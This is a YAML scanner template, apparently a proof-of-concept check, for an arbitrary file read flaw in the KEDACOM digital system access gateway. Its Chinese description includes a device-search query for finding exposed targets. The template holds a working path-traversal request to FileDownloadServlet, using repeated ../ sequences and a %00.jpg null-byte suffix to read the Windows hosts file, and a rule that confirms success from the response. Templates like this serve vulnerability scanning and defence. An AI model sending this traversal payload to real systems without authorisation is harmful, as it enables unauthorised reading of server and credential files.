expression: r0()
id: kedacom-gateway-file-read
info:
  author: zan8in
  description: "KEDACOM \u6570\u5B57\u7CFB\u7EDF\u63A5\u5165\u7F51\u5173 \u5B58\u5728\
    \u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u901A\
    \u8FC7\u6784\u9020\u8BF7\u6C42\u53EF\u4EE5\u8BFB\u53D6\u670D\u52A1\u5668\u4EFB\
    \u610F\u6587\u4EF6\n(app=\"KEDACOM-DVR\u63A5\u5165\u7F51\u5173\") && (is_honeypot=false\
    \ && is_fraud=false)\n"
  name: "KEDACOM\u6570\u5B57\u7CFB\u7EDF\u63A5\u5165\u7F51\u5173 \u4EFB\u610F\u6587\
    \u4EF6\u8BFB\u53D6\u6F0F\u6D1E"
  reference:
  - http://wiki.peiqi.tech/wiki/iot/KEDACOM/KEDACOM%E6%95%B0%E5%AD%97%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html
  severity: high
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'Microsoft TCP/IP
      for Windows') && response.body.bcontains(b'HOSTS file')
    request:
      method: GET
      path: /gatewayweb/FileDownloadServlet?fileName=test.txt&filePath=../../../../../../../../../../Windows/System32/drivers/etc/hosts%00.jpg&type=2
